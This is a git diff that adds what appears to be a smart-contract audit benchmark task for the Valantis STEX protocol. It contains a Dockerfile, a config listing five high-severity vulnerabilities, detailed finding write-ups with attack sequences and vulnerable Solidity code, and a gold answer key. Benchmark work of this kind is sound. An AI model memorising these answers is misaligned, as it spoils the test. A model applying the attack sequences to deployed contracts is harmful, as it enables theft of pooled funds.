@@ -1,0 +1,1423 @@
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/.dockerignore b/project/evmbench/audits/2025-03-valantis-stex/.dockerignore
+new file mode 100644
+index 0000000..4d0f9ce
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/.dockerignore
+@@ -0,0 +1,3 @@
++**
++!Dockerfile
++!.dockerignore
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/Dockerfile b/project/evmbench/audits/2025-03-valantis-stex/Dockerfile
+new file mode 100644
+index 0000000..85a2f41
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/Dockerfile
+@@ -0,0 +1,40 @@
++FROM pranay5255/yudaii_evmbench@sha256:745a1f8d9c49a855f02d0a7254e902f139f4d385a889d1815d699ab05c16c1a0
++
++RUN mkdir -p "$AUDIT_DIR" \
++    && cd "$AUDIT_DIR" \
++    && git init \
++    && git remote add origin https://github.com/ValantisLabs/valantis-stex \
++    && git fetch --depth=1 origin 25a19b663f86b53112a5e020c843904a571cc1e8 \
++    && git checkout --detach FETCH_HEAD \
++    && test "$(git rev-parse HEAD)" = "25a19b663f86b53112a5e020c843904a571cc1e8" \
++    && test "$(git rev-list --all --count)" = "1" \
++    && git submodule update --init --recursive --depth=1 \
++    && test "$(git -C lib/forge-std rev-parse HEAD)" = "b93cf4bc34ff214c099dc970b153f85ade8c9f66" \
++    && test "$(git -C lib/openzeppelin-contracts rev-parse HEAD)" = "acd4ff74de833399287ed6b31b4debf6b2b35527" \
++    && test "$(git -C lib/openzeppelin-contracts/lib/erc4626-tests rev-parse HEAD)" = "8b1d7c2ac248c33c3506b1bff8321758943c5e11" \
++    && test "$(git -C lib/openzeppelin-contracts/lib/forge-std rev-parse HEAD)" = "8f24d6b04c92975e0795b5868aa0d783251cdeaa" \
++    && test "$(git -C lib/openzeppelin-contracts/lib/halmos-cheatcodes rev-parse HEAD)" = "c0d865508c0fee0a11b97732c5e90f9cad6b65a5" \
++    && test "$(git -C lib/solmate rev-parse HEAD)" = "c93f7716c9909175d45f6ef80a34a650e2d24e56" \
++    && test "$(git -C lib/solmate/lib/ds-test rev-parse HEAD)" = "e282159d5170298eb2455a6c05280ab5a73a4ef0" \
++    && test "$(git -C lib/valantis-core rev-parse HEAD)" = "18ee8bb9ad91871ddfdb711f0522f15d89e03673" \
++    && test "$(git -C lib/valantis-core/lib/forge-std rev-parse HEAD)" = "2f112697506eab12d433a65fdc31a639548fe365" \
++    && test "$(git -C lib/valantis-core/lib/forge-std/lib/ds-test rev-parse HEAD)" = "e282159d5170298eb2455a6c05280ab5a73a4ef0" \
++    && test "$(git -C lib/valantis-core/lib/openzeppelin-contracts rev-parse HEAD)" = "281550b71c3df9a83e6b80ceefc700852c287570" \
++    && test "$(git -C lib/valantis-core/lib/openzeppelin-contracts/lib/erc4626-tests rev-parse HEAD)" = "8b1d7c2ac248c33c3506b1bff8321758943c5e11" \
++    && test "$(git -C lib/valantis-core/lib/openzeppelin-contracts/lib/forge-std rev-parse HEAD)" = "c2236853aadb8e2d9909bbecdc490099519b70a4" \
++    && test "$(git -C lib/valantis-core/lib/openzeppelin-contracts/lib/forge-std/lib/ds-test rev-parse HEAD)" = "6da7dd8f7395f83e1fb6fa88a64ba9a030f85d4f" \
++    && forge build \
++    && forge test \
++    && find "$AUDIT_DIR" -type f -iname '*.pdf' -delete \
++    && find "$AUDIT_DIR" -mindepth 2 -name .git -prune -exec rm -rf {} + \
++    && rm -rf "$AUDIT_DIR/.git/modules" \
++    && test -z "$(find "$AUDIT_DIR" -type f -iname '*.pdf' -print -quit)" \
++    && test -z "$(find "$AUDIT_DIR" -mindepth 2 -name .git -print -quit)" \
++    && test ! -e "$AUDIT_DIR/.git/modules" \
++    && test "$(git rev-parse HEAD)" = "25a19b663f86b53112a5e020c843904a571cc1e8" \
++    && test "$(git rev-list --all --count)" = "1" \
++    && test -z "$(git ls-tree -r --name-only HEAD | grep -Ei '\\.pdf$')"
++
++ENV FOUNDRY_OFFLINE=true
++
++WORKDIR $AGENT_DIR
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/config.yaml b/project/evmbench/audits/2025-03-valantis-stex/config.yaml
+new file mode 100644
+index 0000000..2344377
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/config.yaml
+@@ -0,0 +1,21 @@
++id: 2025-03-valantis-stex
++mode: detect
++framework: foundry
++base_commit: 25a19b663f86b53112a5e020c843904a571cc1e8
++
++vulnerabilities:
++  - id: "H-01"
++    title: "Stale pending-withdrawal accounting misprices LP shares"
++    award: 1.0
++  - id: "H-02"
++    title: "Swap callback can steal unstaking surplus"
++    award: 1.0
++  - id: "H-03"
++    title: "Lending-module migration strands withdrawn token1"
++    award: 1.0
++  - id: "H-04"
++    title: "Withdrawal checkpoints let later claims bypass FIFO"
++    award: 1.0
++  - id: "H-05"
++    title: "Withdrawal read-only reentrancy discounts swap fees"
++    award: 1.0
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/findings/H-01.md b/project/evmbench/audits/2025-03-valantis-stex/findings/H-01.md
+new file mode 100644
+index 0000000..41db979
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/findings/H-01.md
+@@ -0,0 +1,86 @@
++# [H-01] Stale pending-withdrawal accounting misprices LP shares
++
++## Affected code
++
++- `src/STEXAMM.sol`: `deposit` and `withdraw`
++- `src/stHYPEWithdrawalModule.sol`: `amountToken0PendingUnstaking`,
++  `burnToken0AfterWithdraw`, and `update`
++
++## Root cause
++
++STEXAMM values LP shares using two pending-withdrawal quantities that observe
++different accounting states. `amountToken1PendingLPWithdrawal` is a public
++storage getter and changes only when a request is created or `update()` runs.
++`amountToken0PendingUnstaking()`, however, immediately subtracts newly arrived
++native HYPE from `_amountToken0PendingUnstaking`.
++
++After the Overseer sends HYPE but before `update()` executes, the token0 side
++has already incorporated settlement while the token1 liability remains stale.
++Both `deposit` and `withdraw` then price shares from an internally inconsistent
++asset total.
++
++## Failure sequence
++
++1. LP withdrawals increase `amountToken1PendingLPWithdrawal`.
++2. The owner initiates asynchronous stHYPE unstaking, increasing
++   `_amountToken0PendingUnstaking`.
++3. The Overseer sends native HYPE to the withdrawal module.
++4. Before `update()` is called, `amountToken0PendingUnstaking()` nets the new
++   HYPE balance but `amountToken1PendingLPWithdrawal()` still returns its old
++   value.
++5. A deposit or withdrawal uses the mismatched values in its share formula.
++
++## Impact
++
++When the stale liability understates the denominator, a depositor receives too
++many shares and dilutes existing LPs. The same stale subtraction can reduce a
++withdrawing LP's token0 entitlement. Value is transferred between LP cohorts
++solely according to settlement and keeper timing.
++
++## Code evidence
++
++`STEXAMM.deposit` subtracts the stored pending token1 amount from a total whose
++pending token0 component is already balance-aware:
++
++```solidity
++(uint256 reserve0Pool, uint256 reserve1Pool) =
++    ISovereignPool(pool).getReserves();
++uint256 reserve0Total =
++    reserve0Pool + _withdrawalModule.amountToken0PendingUnstaking();
++uint256 reserve1PendingWithdrawal =
++    _withdrawalModule.amountToken1PendingLPWithdrawal();
++
++shares = Math.mulDiv(
++    _amount,
++    totalSupplyCache,
++    reserve1Pool + _withdrawalModule.amountToken1LendingPool()
++        + _withdrawalModule.convertToToken1(reserve0Total)
++        - reserve1PendingWithdrawal
++);
++```
++
++The token0 getter immediately observes native HYPE that arrived since the last
++state update:
++
++```solidity
++uint256 balanceNative = address(this).balance;
++uint256 excessNative =
++    balanceNative > amountToken1ClaimableLPWithdrawal
++        ? balanceNative - amountToken1ClaimableLPWithdrawal
++        : 0;
++
++if (_amountToken0PendingUnstaking > excessNative) {
++    return _amountToken0PendingUnstaking - excessNative;
++}
++return 0;
++```
++
++There is no equivalent balance-aware getter for the vulnerable
++`amountToken1PendingLPWithdrawal` storage variable.
++
++## Remediation
++
++Calculate both pending quantities from the same excess-native-balance snapshot,
++or force the accounting update before any share-price operation. The fixed
++implementation introduces a balance-aware token1 getter and a shared
++`_getExcessNativeBalance()` calculation.
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/findings/H-02.md b/project/evmbench/audits/2025-03-valantis-stex/findings/H-02.md
+new file mode 100644
+index 0000000..3767ab1
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/findings/H-02.md
+@@ -0,0 +1,69 @@
++# [H-02] Swap callback can steal unstaking surplus
++
++## Affected code
++
++- `src/stHYPEWithdrawalModule.sol`: `update`
++- Pinned `valantis-core`: `SovereignPool.swap` and
++  `_handleTokenInTransfersOnSwap`
++
++## Root cause
++
++The public `update()` function uses only the withdrawal module's local
++reentrancy guard. It does not reject execution while the Sovereign Pool is
++locked inside a swap. When surplus native HYPE exists, `update()` wraps it and
++transfers token1 directly to the pool.
++
++For callback-funded swaps, the pool treats any token balance increase during
++the callback as payment from the caller. It cannot distinguish the withdrawal
++module's reserve replenishment from attacker-funded input.
++
++## Attack sequence
++
++1. Settled unstaking leaves surplus native HYPE in the withdrawal module.
++2. An attacker starts a token1-to-token0 Sovereign Pool swap with the payment
++   callback enabled.
++3. The pool records its token1 balance and calls the attacker's callback.
++4. The attacker calls public `update()` during that callback.
++5. `update()` wraps the surplus and transfers the resulting token1 to the pool.
++6. The pool observes the balance increase, accepts it as the attacker's input,
++   and sends stHYPE/token0 to the attacker.
++
++## Impact
++
++The attacker receives pool token0 without supplying the token1 counted as
++payment. The entire available surplus can be converted into attacker-owned
++assets, directly stealing pool value.
++
++## Code evidence
++
++The vulnerable update donates the surplus directly:
++
++```solidity
++token1.deposit{value: balanceSurplus}();
++token1.safeTransfer(stexInterface.pool(), balanceSurplus);
++```
++
++The pinned pool measures callback payment only as a balance delta:
++
++```solidity
++uint256 preBalance = token.balanceOf(sovereignVault);
++
++if (isSwapCallback) {
++    ISovereignPoolSwapCallback(msg.sender).sovereignPoolSwapCallback(
++        address(token), amountInUsed, _swapCallbackContext
++    );
++}
++
++uint256 amountInReceived =
++    token.balanceOf(sovereignVault) - preBalance;
++```
++
++`update()` is unrestricted and has no Sovereign Pool lock check in the
++vulnerable snapshot.
++
++## Remediation
++
++Reject `update()` and any equivalent reserve transfer while
++`SovereignPool.isLocked()` is true, or route replenishment through a
++non-reentrant pool donation primitive. The fixed implementation stores the pool
++address and applies a `whenPoolNotLocked` guard.
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/findings/H-03.md b/project/evmbench/audits/2025-03-valantis-stex/findings/H-03.md
+new file mode 100644
+index 0000000..c685594
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/findings/H-03.md
+@@ -0,0 +1,63 @@
++# [H-03] Lending-module migration strands withdrawn token1
++
++## Affected code
++
++- `src/stHYPEWithdrawalModule.sol`: `setProposedLendingModule` and
++  `supplyToken1ToLendingPool`
++
++## Root cause
++
++Activating a proposed lending module withdraws the old module's entire token1
++position to `address(this)`. The function then replaces the module reference
++without transferring that ERC20 balance to the Sovereign Pool or depositing it
++into the replacement module.
++
++The remaining supply function cannot recover the balance: it first pulls fresh
++token1 reserves out of the pool and deposits only that requested amount.
++No function sweeps token1 already held by the withdrawal module.
++
++## Failure sequence
++
++1. The owner proposes a new lending module and waits for the timelock.
++2. `setProposedLendingModule()` withdraws the old module's full position to the
++   withdrawal module.
++3. The function immediately replaces `lendingModule` and deletes the proposal.
++4. The withdrawn token1 is not reserve in the Sovereign Pool and is not owned
++   by the new lending position.
++5. No exposed path can return or redeposit that existing balance.
++
++## Impact
++
++Pool-owned token1 becomes inaccessible to reserve accounting and user
++withdrawals. A normal administrative migration can therefore strand the full
++old lending position and leave LP assets unusable.
++
++## Code evidence
++
++```solidity
++if (address(lendingModule) != address(0)) {
++    lendingModule.withdraw(
++        lendingModule.assetBalance(),
++        address(this)
++    );
++}
++
++lendingModule =
++    ILendingModule(lendingModuleProposal.lendingModule);
++delete lendingModuleProposal;
++```
++
++The only path that supplies the new module takes fresh assets from the pool:
++
++```solidity
++stexInterface.supplyToken1Reserves(_amountToken1);
++IWETH9(token1).forceApprove(address(lendingModule), _amountToken1);
++lendingModule.deposit(_amountToken1);
++```
++
++## Remediation
++
++Withdraw the old lending position directly to the Sovereign Pool so it becomes
++reserve immediately, then explicitly supply any desired amount from the pool
++to the replacement module. The fixed implementation uses the pool as the
++withdrawal recipient.
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/findings/H-04.md b/project/evmbench/audits/2025-03-valantis-stex/findings/H-04.md
+new file mode 100644
+index 0000000..ade1297
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/findings/H-04.md
+@@ -0,0 +1,71 @@
++# [H-04] Withdrawal checkpoints let later claims bypass FIFO
++
++## Affected code
++
++- `src/stHYPEWithdrawalModule.sol`: `burnToken0AfterWithdraw`, `update`, and
++  `claim`
++- `src/structs/WithdrawalModuleStructs.sol`: `LPWithdrawalRequest`
++
++## Root cause
++
++Each withdrawal request stores
++`cumulativeAmountToken1ClaimableLPWithdrawal`, the amount already fulfilled at
++creation. It does not checkpoint cumulative queued obligations. Multiple
++requests created before another settlement update can therefore receive the
++same checkpoint.
++
++Eligibility is then checked as that shared checkpoint plus only the request's
++own size. A later small request becomes eligible before an earlier large
++request even though FIFO requires all earlier obligations to be funded first.
++
++## Attack sequence
++
++1. User 1 queues a large withdrawal at fulfilled checkpoint `X`.
++2. Before another update, User 2 queues a smaller withdrawal at the same
++   checkpoint `X`.
++3. Partial settlement makes cumulative fulfilled liquidity exceed
++   `X + User2Amount` but not the total obligations through User 1.
++4. User 2's claim passes and consumes claimable HYPE.
++5. User 1's earlier claim fails because the remaining claimable balance is
++   insufficient.
++
++## Impact
++
++A later LP obtains an effectively instant, fee-free exit using liquidity that
++FIFO reserves for an earlier LP. The earlier recipient loses access to their
++funds until further settlement and bears the resulting liquidity and timing
++risk.
++
++## Code evidence
++
++All requests created before the next update can store the same value:
++
++```solidity
++LPWithdrawals[idLPWithdrawal] = LPWithdrawalRequest({
++    recipient: _recipient,
++    amountToken1: amountToken1.toUint96(),
++    cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint:
++        cumulativeAmountToken1ClaimableLPWithdrawal
++});
++```
++
++The claim threshold then depends only on the request's own amount:
++
++```solidity
++if (
++    cumulativeAmountToken1ClaimableLPWithdrawal
++        < request.cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint
++            + request.amountToken1
++) {
++    revert stHYPEWithdrawalModule__claim_cannotYetClaim();
++}
++
++amountToken1ClaimableLPWithdrawal -= request.amountToken1;
++```
++
++## Remediation
++
++Checkpoint cumulative token1 obligations when requests are created, and allow
++a request only after cumulative fulfilled liquidity reaches that request's
++position in the owed queue. The fixed implementation introduces
++`cumulativeAmountToken1LPWithdrawal`.
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/findings/H-05.md b/project/evmbench/audits/2025-03-valantis-stex/findings/H-05.md
+new file mode 100644
+index 0000000..7fc48ee
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/findings/H-05.md
+@@ -0,0 +1,91 @@
++# [H-05] Withdrawal read-only reentrancy discounts swap fees
++
++## Affected code
++
++- `src/STEXAMM.sol`: `withdraw` and `getLiquidityQuote`
++- `src/STEXRatioSwapFeeModule.sol`: `getSwapFeeInBips`
++- Pinned `valantis-core`: `SovereignPool.swap`
++
++## Root cause
++
++When an LP requests native HYPE, `withdraw()` calls the recipient after burning
++shares and recording the token0 withdrawal but before removing the remaining
++token1 from the Sovereign Pool. The callback recipient can start a pool swap
++while STEXAMM exposes this intermediate reserve/liability ratio.
++
++The dynamic fee module reads the transient ratio. The pool then calls
++view-only `STEXAMM.getLiquidityQuote`, which does not check whether STEXAMM's
++reentrancy guard is already entered. The swap can therefore complete while the
++outer withdrawal remains in progress.
++
++## Attack sequence
++
++1. An LP withdraws to a contract recipient with native-token unwrapping.
++2. STEXAMM burns the LP shares and records token0 as a pending withdrawal.
++3. `Address.sendValue` gives the recipient control before linearly subsequent
++   pool token1 removal.
++4. The recipient performs a token0-to-token1 Sovereign Pool swap.
++5. `getSwapFeeInBips` observes a temporarily depressed token0/token1 ratio and
++   chooses a lower dynamic fee.
++6. Unguarded `getLiquidityQuote` remains callable, so the discounted swap
++   completes before the outer withdrawal restores a settled state.
++
++## Impact
++
++The callback trader retains the fee discount while the pool manager or protocol
++collects less fee revenue than the same swap would owe in a settled state.
++Repeated use leaks protocol revenue to the attacker.
++
++## Code evidence
++
++The recipient callback precedes pool token1 removal:
++
++```solidity
++if (_unwrapToNativeToken) {
++    IWETH9(token1).withdraw(cache.amount1LendingPool);
++    Address.sendValue(
++        payable(_recipient),
++        cache.amount1LendingPool
++    );
++}
++
++// Executed later
++ISovereignPool(pool).withdrawLiquidity(
++    0,
++    cache.amount1Remaining,
++    msg.sender,
++    address(this),
++    new bytes(0)
++);
++```
++
++The fee uses live reserves and the newly changed pending liability:
++
++```solidity
++uint256 amount0Total =
++    reserve0 + amount0PendingUnstaking + _amountIn
++        - amountToken0PendingLPWithdrawal;
++uint256 reserve1Total =
++    reserve1 + withdrawalModuleInterface.amountToken1LendingPool();
++uint256 ratioBips = (amount0Total * BIPS) / reserve1Total;
++```
++
++The vulnerable quote function is an unguarded external view:
++
++```solidity
++function getLiquidityQuote(...)
++    external
++    view
++    override
++    returns (ALMLiquidityQuote memory quote)
++{
++    quote.amountInFilled = _almLiquidityQuoteInput.amountInMinusFee;
++    // ...
++}
++```
++
++## Remediation
++
++Make every view path used by a swap reject execution while STEXAMM's
++reentrancy guard is entered. The fixed implementation checks
++`_reentrancyGuardEntered()` at the start of `getLiquidityQuote`.
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/findings/gold_audit.md b/project/evmbench/audits/2025-03-valantis-stex/findings/gold_audit.md
+new file mode 100644
+index 0000000..a8a8782
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/findings/gold_audit.md
+@@ -0,0 +1,380 @@
++# [H-01] Stale pending-withdrawal accounting misprices LP shares
++
++## Affected code
++
++- `src/STEXAMM.sol`: `deposit` and `withdraw`
++- `src/stHYPEWithdrawalModule.sol`: `amountToken0PendingUnstaking`,
++  `burnToken0AfterWithdraw`, and `update`
++
++## Root cause
++
++STEXAMM values LP shares using two pending-withdrawal quantities that observe
++different accounting states. `amountToken1PendingLPWithdrawal` is a public
++storage getter and changes only when a request is created or `update()` runs.
++`amountToken0PendingUnstaking()`, however, immediately subtracts newly arrived
++native HYPE from `_amountToken0PendingUnstaking`.
++
++After the Overseer sends HYPE but before `update()` executes, the token0 side
++has already incorporated settlement while the token1 liability remains stale.
++Both `deposit` and `withdraw` then price shares from an internally inconsistent
++asset total.
++
++## Failure sequence
++
++1. LP withdrawals increase `amountToken1PendingLPWithdrawal`.
++2. The owner initiates asynchronous stHYPE unstaking, increasing
++   `_amountToken0PendingUnstaking`.
++3. The Overseer sends native HYPE to the withdrawal module.
++4. Before `update()` is called, `amountToken0PendingUnstaking()` nets the new
++   HYPE balance but `amountToken1PendingLPWithdrawal()` still returns its old
++   value.
++5. A deposit or withdrawal uses the mismatched values in its share formula.
++
++## Impact
++
++When the stale liability understates the denominator, a depositor receives too
++many shares and dilutes existing LPs. The same stale subtraction can reduce a
++withdrawing LP's token0 entitlement. Value is transferred between LP cohorts
++solely according to settlement and keeper timing.
++
++## Code evidence
++
++`STEXAMM.deposit` subtracts the stored pending token1 amount from a total whose
++pending token0 component is already balance-aware:
++
++```solidity
++(uint256 reserve0Pool, uint256 reserve1Pool) =
++    ISovereignPool(pool).getReserves();
++uint256 reserve0Total =
++    reserve0Pool + _withdrawalModule.amountToken0PendingUnstaking();
++uint256 reserve1PendingWithdrawal =
++    _withdrawalModule.amountToken1PendingLPWithdrawal();
++
++shares = Math.mulDiv(
++    _amount,
++    totalSupplyCache,
++    reserve1Pool + _withdrawalModule.amountToken1LendingPool()
++        + _withdrawalModule.convertToToken1(reserve0Total)
++        - reserve1PendingWithdrawal
++);
++```
++
++The token0 getter immediately observes native HYPE that arrived since the last
++state update:
++
++```solidity
++uint256 balanceNative = address(this).balance;
++uint256 excessNative =
++    balanceNative > amountToken1ClaimableLPWithdrawal
++        ? balanceNative - amountToken1ClaimableLPWithdrawal
++        : 0;
++
++if (_amountToken0PendingUnstaking > excessNative) {
++    return _amountToken0PendingUnstaking - excessNative;
++}
++return 0;
++```
++
++There is no equivalent balance-aware getter for the vulnerable
++`amountToken1PendingLPWithdrawal` storage variable.
++
++## Remediation
++
++Calculate both pending quantities from the same excess-native-balance snapshot,
++or force the accounting update before any share-price operation. The fixed
++implementation introduces a balance-aware token1 getter and a shared
++`_getExcessNativeBalance()` calculation.
++# [H-02] Swap callback can steal unstaking surplus
++
++## Affected code
++
++- `src/stHYPEWithdrawalModule.sol`: `update`
++- Pinned `valantis-core`: `SovereignPool.swap` and
++  `_handleTokenInTransfersOnSwap`
++
++## Root cause
++
++The public `update()` function uses only the withdrawal module's local
++reentrancy guard. It does not reject execution while the Sovereign Pool is
++locked inside a swap. When surplus native HYPE exists, `update()` wraps it and
++transfers token1 directly to the pool.
++
++For callback-funded swaps, the pool treats any token balance increase during
++the callback as payment from the caller. It cannot distinguish the withdrawal
++module's reserve replenishment from attacker-funded input.
++
++## Attack sequence
++
++1. Settled unstaking leaves surplus native HYPE in the withdrawal module.
++2. An attacker starts a token1-to-token0 Sovereign Pool swap with the payment
++   callback enabled.
++3. The pool records its token1 balance and calls the attacker's callback.
++4. The attacker calls public `update()` during that callback.
++5. `update()` wraps the surplus and transfers the resulting token1 to the pool.
++6. The pool observes the balance increase, accepts it as the attacker's input,
++   and sends stHYPE/token0 to the attacker.
++
++## Impact
++
++The attacker receives pool token0 without supplying the token1 counted as
++payment. The entire available surplus can be converted into attacker-owned
++assets, directly stealing pool value.
++
++## Code evidence
++
++The vulnerable update donates the surplus directly:
++
++```solidity
++token1.deposit{value: balanceSurplus}();
++token1.safeTransfer(stexInterface.pool(), balanceSurplus);
++```
++
++The pinned pool measures callback payment only as a balance delta:
++
++```solidity
++uint256 preBalance = token.balanceOf(sovereignVault);
++
++if (isSwapCallback) {
++    ISovereignPoolSwapCallback(msg.sender).sovereignPoolSwapCallback(
++        address(token), amountInUsed, _swapCallbackContext
++    );
++}
++
++uint256 amountInReceived =
++    token.balanceOf(sovereignVault) - preBalance;
++```
++
++`update()` is unrestricted and has no Sovereign Pool lock check in the
++vulnerable snapshot.
++
++## Remediation
++
++Reject `update()` and any equivalent reserve transfer while
++`SovereignPool.isLocked()` is true, or route replenishment through a
++non-reentrant pool donation primitive. The fixed implementation stores the pool
++address and applies a `whenPoolNotLocked` guard.
++# [H-03] Lending-module migration strands withdrawn token1
++
++## Affected code
++
++- `src/stHYPEWithdrawalModule.sol`: `setProposedLendingModule` and
++  `supplyToken1ToLendingPool`
++
++## Root cause
++
++Activating a proposed lending module withdraws the old module's entire token1
++position to `address(this)`. The function then replaces the module reference
++without transferring that ERC20 balance to the Sovereign Pool or depositing it
++into the replacement module.
++
++The remaining supply function cannot recover the balance: it first pulls fresh
++token1 reserves out of the pool and deposits only that requested amount.
++No function sweeps token1 already held by the withdrawal module.
++
++## Failure sequence
++
++1. The owner proposes a new lending module and waits for the timelock.
++2. `setProposedLendingModule()` withdraws the old module's full position to the
++   withdrawal module.
++3. The function immediately replaces `lendingModule` and deletes the proposal.
++4. The withdrawn token1 is not reserve in the Sovereign Pool and is not owned
++   by the new lending position.
++5. No exposed path can return or redeposit that existing balance.
++
++## Impact
++
++Pool-owned token1 becomes inaccessible to reserve accounting and user
++withdrawals. A normal administrative migration can therefore strand the full
++old lending position and leave LP assets unusable.
++
++## Code evidence
++
++```solidity
++if (address(lendingModule) != address(0)) {
++    lendingModule.withdraw(
++        lendingModule.assetBalance(),
++        address(this)
++    );
++}
++
++lendingModule =
++    ILendingModule(lendingModuleProposal.lendingModule);
++delete lendingModuleProposal;
++```
++
++The only path that supplies the new module takes fresh assets from the pool:
++
++```solidity
++stexInterface.supplyToken1Reserves(_amountToken1);
++IWETH9(token1).forceApprove(address(lendingModule), _amountToken1);
++lendingModule.deposit(_amountToken1);
++```
++
++## Remediation
++
++Withdraw the old lending position directly to the Sovereign Pool so it becomes
++reserve immediately, then explicitly supply any desired amount from the pool
++to the replacement module. The fixed implementation uses the pool as the
++withdrawal recipient.
++# [H-04] Withdrawal checkpoints let later claims bypass FIFO
++
++## Affected code
++
++- `src/stHYPEWithdrawalModule.sol`: `burnToken0AfterWithdraw`, `update`, and
++  `claim`
++- `src/structs/WithdrawalModuleStructs.sol`: `LPWithdrawalRequest`
++
++## Root cause
++
++Each withdrawal request stores
++`cumulativeAmountToken1ClaimableLPWithdrawal`, the amount already fulfilled at
++creation. It does not checkpoint cumulative queued obligations. Multiple
++requests created before another settlement update can therefore receive the
++same checkpoint.
++
++Eligibility is then checked as that shared checkpoint plus only the request's
++own size. A later small request becomes eligible before an earlier large
++request even though FIFO requires all earlier obligations to be funded first.
++
++## Attack sequence
++
++1. User 1 queues a large withdrawal at fulfilled checkpoint `X`.
++2. Before another update, User 2 queues a smaller withdrawal at the same
++   checkpoint `X`.
++3. Partial settlement makes cumulative fulfilled liquidity exceed
++   `X + User2Amount` but not the total obligations through User 1.
++4. User 2's claim passes and consumes claimable HYPE.
++5. User 1's earlier claim fails because the remaining claimable balance is
++   insufficient.
++
++## Impact
++
++A later LP obtains an effectively instant, fee-free exit using liquidity that
++FIFO reserves for an earlier LP. The earlier recipient loses access to their
++funds until further settlement and bears the resulting liquidity and timing
++risk.
++
++## Code evidence
++
++All requests created before the next update can store the same value:
++
++```solidity
++LPWithdrawals[idLPWithdrawal] = LPWithdrawalRequest({
++    recipient: _recipient,
++    amountToken1: amountToken1.toUint96(),
++    cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint:
++        cumulativeAmountToken1ClaimableLPWithdrawal
++});
++```
++
++The claim threshold then depends only on the request's own amount:
++
++```solidity
++if (
++    cumulativeAmountToken1ClaimableLPWithdrawal
++        < request.cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint
++            + request.amountToken1
++) {
++    revert stHYPEWithdrawalModule__claim_cannotYetClaim();
++}
++
++amountToken1ClaimableLPWithdrawal -= request.amountToken1;
++```
++
++## Remediation
++
++Checkpoint cumulative token1 obligations when requests are created, and allow
++a request only after cumulative fulfilled liquidity reaches that request's
++position in the owed queue. The fixed implementation introduces
++`cumulativeAmountToken1LPWithdrawal`.
++# [H-05] Withdrawal read-only reentrancy discounts swap fees
++
++## Affected code
++
++- `src/STEXAMM.sol`: `withdraw` and `getLiquidityQuote`
++- `src/STEXRatioSwapFeeModule.sol`: `getSwapFeeInBips`
++- Pinned `valantis-core`: `SovereignPool.swap`
++
++## Root cause
++
++When an LP requests native HYPE, `withdraw()` calls the recipient after burning
++shares and recording the token0 withdrawal but before removing the remaining
++token1 from the Sovereign Pool. The callback recipient can start a pool swap
++while STEXAMM exposes this intermediate reserve/liability ratio.
++
++The dynamic fee module reads the transient ratio. The pool then calls
++view-only `STEXAMM.getLiquidityQuote`, which does not check whether STEXAMM's
++reentrancy guard is already entered. The swap can therefore complete while the
++outer withdrawal remains in progress.
++
++## Attack sequence
++
++1. An LP withdraws to a contract recipient with native-token unwrapping.
++2. STEXAMM burns the LP shares and records token0 as a pending withdrawal.
++3. `Address.sendValue` gives the recipient control before linearly subsequent
++   pool token1 removal.
++4. The recipient performs a token0-to-token1 Sovereign Pool swap.
++5. `getSwapFeeInBips` observes a temporarily depressed token0/token1 ratio and
++   chooses a lower dynamic fee.
++6. Unguarded `getLiquidityQuote` remains callable, so the discounted swap
++   completes before the outer withdrawal restores a settled state.
++
++## Impact
++
++The callback trader retains the fee discount while the pool manager or protocol
++collects less fee revenue than the same swap would owe in a settled state.
++Repeated use leaks protocol revenue to the attacker.
++
++## Code evidence
++
++The recipient callback precedes pool token1 removal:
++
++```solidity
++if (_unwrapToNativeToken) {
++    IWETH9(token1).withdraw(cache.amount1LendingPool);
++    Address.sendValue(
++        payable(_recipient),
++        cache.amount1LendingPool
++    );
++}
++
++// Executed later
++ISovereignPool(pool).withdrawLiquidity(
++    0,
++    cache.amount1Remaining,
++    msg.sender,
++    address(this),
++    new bytes(0)
++);
++```
++
++The fee uses live reserves and the newly changed pending liability:
++
++```solidity
++uint256 amount0Total =
++    reserve0 + amount0PendingUnstaking + _amountIn
++        - amountToken0PendingLPWithdrawal;
++uint256 reserve1Total =
++    reserve1 + withdrawalModuleInterface.amountToken1LendingPool();
++uint256 ratioBips = (amount0Total * BIPS) / reserve1Total;
++```
++
++The vulnerable quote function is an unguarded external view:
++
++```solidity
++function getLiquidityQuote(...)
++    external
++    view
++    override
++    returns (ALMLiquidityQuote memory quote)
++{
++    quote.amountInFilled = _almLiquidityQuoteInput.amountInMinusFee;
++    // ...
++}
++```
++
++## Remediation
++
++Make every view path used by a swap reject execution while STEXAMM's
++reentrancy guard is entered. The fixed implementation checks
++`_reentrancyGuardEntered()` at the start of `getLiquidityQuote`.
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl
+new file mode 100644
+index 0000000..7361a0d
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-01.pages.jsonl
+@@ -0,0 +1,3 @@
